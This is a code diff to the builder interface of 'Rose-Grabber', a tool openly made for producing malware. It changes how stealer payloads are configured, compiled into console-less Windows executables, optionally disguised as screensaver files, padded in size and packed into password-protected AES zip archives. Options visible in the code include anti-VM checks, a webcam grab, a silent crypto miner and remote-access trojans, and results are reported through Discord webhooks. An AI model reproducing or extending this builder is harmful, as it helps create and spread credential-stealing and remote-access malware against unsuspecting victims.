@@ -3,37 +3,26 @@ import os
 if sys.executable.endswith('pythonw.exe'):
     sys.stdout = open(os.devnull, 'w')
     sys.stderr = open(os.path.join(os.getenv('TEMP'), 'stderr-{}'.format(os.path.basename(sys.argv[0]))), "w")
-
-from flaskwebgui import FlaskUI
-from nicegui import ui, app
+import string
 import requests
 import tkinter as tk
-from tkinter import filedialog
-
-from dhooks import Webhook, Embed 
-import os 
-from pathlib import Path
+import pyzipper
 import ctypes
-
+import pyperclip
 import base64
 import random
-
 import logging
 import subprocess
-
 import re
 import webbrowser
-
+import asyncio
+import shutil
+from nicegui import ui, app
+from tkinter import filedialog
+from dhooks import Webhook, Embed
+from pathlib import Path
 from concurrent.futures import ProcessPoolExecutor
 from multiprocessing import Manager, Queue
-
-import asyncio
-import time
-
-from bs4 import BeautifulSoup
-import shutil
-
-from rich.traceback import install
 
 pool = ProcessPoolExecutor()
 
@@ -100,14 +89,13 @@ links = {
     "suegdu_github": "https://github.com/suegdu",
     "svn_github": "https://github.com/suvan1911",
     "rose_github": "https://github.com/DamagingRose/Rose-Grabber",
-    "rose_discord": "https://discord.gg/Ts9RTFYvyt"
+    "rose_discord": "https://discord.gg/97UeK8PrUY"
 }
 
 logger.critical(f"Rose UI Builder is using version {str(__version__)}")
 
 def open_link(key):
     webbrowser.open(links[key])
-
 
 def auto_update():
     if __debugm__:
@@ -157,11 +145,27 @@ async def test_webhook(webhook_url):
             )
             embed.set_author(name="Success", icon_url=__icon__)
             embed.set_footer(text="Rose Builder | By pierro, suegdu, gumbobr0t, svn", icon_url=__icon__)
-            await hook.send(embed=embed)
+            await hook.send(embed=embed, username='\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72', avatar_url='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x2f\x6d\x61\x69\x6e\x2f\x63\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2f\x72\x65\x61\x64\x6d\x65\x2f\x25\x32\x34\x72\x6f\x73\x65\x2d\x77\x68\x2e\x70\x6e\x67')
         return 0
     except Exception as e:
         logger.error(f"Webhook failed to execute - Link: {webhook_url} - Error: {e}")
         return 1
+
+#open_compile_log_button = ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(Path(__file__).resolve().parent / 'rosecompile.log'))
+#open_compile_log_button.visible = False
+
+#def random_str(count):
+#    characters = string.ascii_letters + string.digits
+#    random_string = ''.join(random.choice(characters) for _ in range(count))
+#    return random_string
+
+random.seed(0)
+
+characters = string.ascii_letters + string.digits
+
+gen = ''.join(random.choice(characters) for _ in range(10))
+zip_passw = ''.join(random.choice(characters) for _ in range(20))
+zip_name = f'Rose-Final-{gen}.zip'
 
 def _makebuild(q: Queue, data_builder) -> str:
     logger.info("Entered _makebuild")
@@ -182,7 +186,7 @@ def _makebuild(q: Queue, data_builder) -> str:
         ui.notify("Knight-RAT Bot Token is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
         return
     
-    if data_builder["icon_file"] == "EXE" or "":
+    if data_builder["icon_file"] == "Windows Exe" or "":
         basic_exe_path = os.getcwd() + 'assets\imageres-011.ico'
         data_builder["icon_path"] = basic_exe_path.replace('roseui', '')
 
@@ -212,7 +216,7 @@ def _makebuild(q: Queue, data_builder) -> str:
 
     def get_files():
         try:
-            logging.debug("Entered get_files")
+            logging.info("Entering get_files")
             cwd = os.getcwd()
             ncwd = cwd.replace('roseui', 'source')
             for file in os.listdir(ncwd):
@@ -252,7 +256,6 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("fake_error = False", f"fake_error = {data_builder['fake_error']}") \
                 .replace("nitro_auto_buy = False", f"nitro_auto_buy = {data_builder['nitro_buy']}") \
                 .replace("antivm = False", f"antivm = {data_builder['antivm']}") \
-                .replace("ANTIVMHOOK", f"{data_builder['antivm_webhook_url']}") \
                 .replace("webcam = False", f"webcam = {data_builder['webcam']}")
                  # noqa: E501
                 
@@ -339,11 +342,14 @@ def _makebuild(q: Queue, data_builder) -> str:
                 except Exception as e:
                     logger.error(f"Error in pumping file: {e}")
 
+    #open_compile_log_button = ui.button("Open Rose Compile Log", on_click=lambda: os.startfile(Path(__file__).resolve().parent / 'rosecompile.log'))
+
     def compile():
         try:
             logger.info("Entering compile process")
             logger.info(f'Compile CMD Line: python -m PyInstaller "{path}\\main.py" --icon="{data_builder["icon_path"]}" --upx-dir="{os.path.join(os.getcwd(), "upx-4.1.0-win64")}" --noconsole --onefile')
             output_file = "rosecompile.log"
+            #open_compile_log_button.visible = True
             subprocess.call(
                 f'python -m PyInstaller "{path}\\main.py" --icon="{data_builder["icon_path"]}" --upx-dir="{os.path.join(os.getcwd(), "upx-4.1.0-win64")}" --noconsole --onefile',
                 shell=True,
@@ -368,11 +374,29 @@ def _makebuild(q: Queue, data_builder) -> str:
                 shutil.rmtree(backup_dir)
         except Exception as e:
             logger.error(f"Error in cleanup: {e}")
-            
+
+    def return_zip():
+        logger.info('Entering return_zip')
+        homename = f'{data_builder["build_name"]}.scr' if data_builder["type_file"] == 'Screensaver (.scr)' else f'{data_builder["build_name"]}.exe'
+
+        with pyzipper.AESZipFile(zip_name, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zipf:
+            zipf.setpassword(zip_passw.encode('utf-8'))
+            zipf.write(homename, os.path.basename(homename))
+        
+        logger.info(f'Password for final zip is: {zip_passw}')
+        logger.debug(f'Encrypted password for final zip is: {zip_passw.encode("utf-8")}')
+
+        try:
+            os.remove(homename)
+        except Exception as e:
+            logger.error(f"Error in removing file: {e}")
+
+        logger.info('Finished return_zip')
+
     def assign_extension():
         old_exe_path = os.getcwd() + f'\{data_builder["build_name"]}.exe'
         new_scr_path = os.getcwd() + f'\{data_builder["build_name"]}.scr'
-        if data_builder["type_file"] == 'Screensaver':
+        if data_builder["type_file"] == 'Screensaver (.scr)':
             os.rename(old_exe_path, new_scr_path)
         
     create_dir()
@@ -384,13 +408,16 @@ def _makebuild(q: Queue, data_builder) -> str:
     #obfuscate()
     q.put_nowait(0.4)
     compile()
-    q.put_nowait(0.6)
+    q.put_nowait(0.5)
     cleanup()
-    q.put_nowait(0.7)
+    q.put_nowait(0.6)
     pump_file()
-    q.put_nowait(0.9)
+    q.put_nowait(0.7)
     assign_extension()
+    q.put_nowait(0.8)
+    return_zip()
     q.put_nowait(1)
+    #open_compile_log_button.visible = False
     return 'Done!'
 
 def select_icon():
@@ -406,9 +433,10 @@ def select_icon():
 
 def _home():
     with ui.dialog() as dialog, ui.card():
-        ui.label('If everything went good, your compiled file should be in the folder, else join our discord')
-        ui.button("Open Folder", on_click=lambda: os.startfile(Path(__file__).resolve().parent))
-        ui.button('Join Discord', on_click=lambda: webbrowser.open('https://discord.gg/Ts9RTFYvyt'))
+        ui.label(f'If the compilation process completed successfully, you should find the password protected zip archive within the designated folder. In case you encounter any issues, we kindly invite you to join our Discord community for further assistance.\nThe name of the zip archive is: {zip_name}\nThe password for the zip archive is: {zip_passw}')
+        ui.button('Open Folder', on_click=lambda: os.startfile(Path(__file__).resolve().parent))
+        ui.button('Join Discord', on_click=lambda: webbrowser.open(links["rose_discord"]))
+        ui.button('Copy password', on_click=lambda: pyperclip.copy(zip_passw))
         ui.button('Close', on_click=dialog.close)
         
     async def start_computation():
@@ -431,26 +459,26 @@ def _home():
             on_change=lambda e: change_data("webhook_url", e.value)
         ).props('inline color=pink-3').classes('w-full')
         ui.input(
-            label='Build Name',
+            label='Build name',
             placeholder='Rose on top baby',
             on_change=lambda e: change_data("build_name", e.value)
         ).props('inline color=pink-3').classes('w-full')
-
         ui.select(
             label='File icon',
-            options=['EXE', 'CUSTOM'],
+            options=['Windows Exe', 'Use Custom'],
             on_change=lambda e: change_data("icon_file", e.value)
         ).props('inline color=pink-3').classes('w-full')
-
-        ui.button('Select Custom Icon', on_click=select_icon)
-
+        ui.button('Set custom file icon', on_click=select_icon)
         ui.select(
-            label='File type',
-            options=["Executable", "Screensaver"],
+            label='Returned file type',
+            options=["Executable (.exe)", "Screensaver (.scr)"],#, "Batch (.bat)", "PowerShell (.ps1)", "Visual Basic Script (.vbs)"],
             on_change=lambda e: change_data('type_file', e.value)
         ).props("color=pink-3").classes('w-full')
-        ui.checkbox('Obfuscate src files', on_change=lambda e: change_data('obfuscation', e.value)).props('inline color=pink-3')  
-
+        ui.checkbox('Obfuscate source code', on_change=lambda e: change_data('obfuscation', e.value)).props('inline color=pink-3')  
+        with ui.row():
+            _pumper = ui.checkbox('Pump file', on_change=lambda e: change_data('file_pumper', e.value)).props('inline color=pink-3')
+            ui.input(label='Pump Size', placeholder='Size in MB',
+                on_change=lambda e: change_data('file_pumper_size', e.value)).bind_visibility_from(_pumper, 'value').props('inline color=pink-3')
         ui.button(
             'Test Webhook',
             on_click=_test_webhook
@@ -504,10 +532,6 @@ def _functions():
                     _miner = ui.checkbox('Silent Crypto Miner', on_change=lambda e: change_data('silent_crypto_miner', e.value)).props('inline color=yellow-7')
                     ui.input(label='Wallet adress', placeholder='Bitcoin wallet adress',
                         on_change=lambda e: change_data('wallet_adress', e.value)).bind_visibility_from(_miner, 'value').props('inline color=yellow-7')
-                with ui.row():
-                    _pumper = ui.checkbox('Pump file', on_change=lambda e: change_data('file_pumper', e.value)).props('inline color=yellow-7')
-                    ui.input(label='Pump Size', placeholder='Size in MB',
-                        on_change=lambda e: change_data('file_pumper_size', e.value)).bind_visibility_from(_pumper, 'value').props('inline color=yellow-7')
                 with ui.row():
                     _rose_rat = ui.checkbox('Rose-RAT', on_change=lambda e: change_data('rose_rat', e.value)).props('inline color=yellow-7')
                     ui.input(label='Rose-RAT Server URL', placeholder='Rose on top baby',
